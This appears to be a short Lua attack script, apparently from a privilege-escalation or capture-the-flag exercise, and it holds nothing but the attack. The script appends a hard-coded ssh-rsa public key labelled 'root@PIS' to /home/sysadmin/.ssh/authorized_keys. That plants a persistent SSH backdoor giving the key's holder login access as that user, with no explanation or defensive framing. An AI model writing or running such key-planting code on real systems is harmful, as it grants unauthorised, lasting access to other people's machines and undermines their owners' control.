local test = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
test:write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmyes5ua/gfYQiQCyR2pMI3uSkA/iy15Y/4C148PVwQBhxbckXbIqABaYwBgLPVC2PRYbu1KEwm+xVNbuhRB0egT16Zm8Q18LNjL14A5ofzODSE1A2RA3eIxbV4v1zx9gfHY6NERA7iFyog+Aep+Yyf/LlN8+b/KkN6n0BpXUznTELEBnluIWamjdTq3LROW4xOCRHP93UhpM+CrvWC7MLwCVMsEt/Dut4TFwXRtRkdktY1dT2zdw5DwYtl9Tn4Wcox8Y2b41LNLXOC0VcIb6bK6qtOv1laJLZQJu5K5tZ4Lpj++PVn1CKENzyEoM/vJ8KTR1e/dZT86jKsRt/fBovMNvSRCwkY6/iZSPl8IHymuLaae4+jWQocxKv7GNGbJxYN0XtuLyxlpV3lgawK7jUB/MkP33NEKebKI0GdPWpkF96SKz/NYbbF9hv7b8RVyf3HoyHp3BjGn54CucmEZRUagkQUcrGCiAliqZb9v2dzUY/cwOmXhY2DaHMrbssemM= root@PIS")
test:close()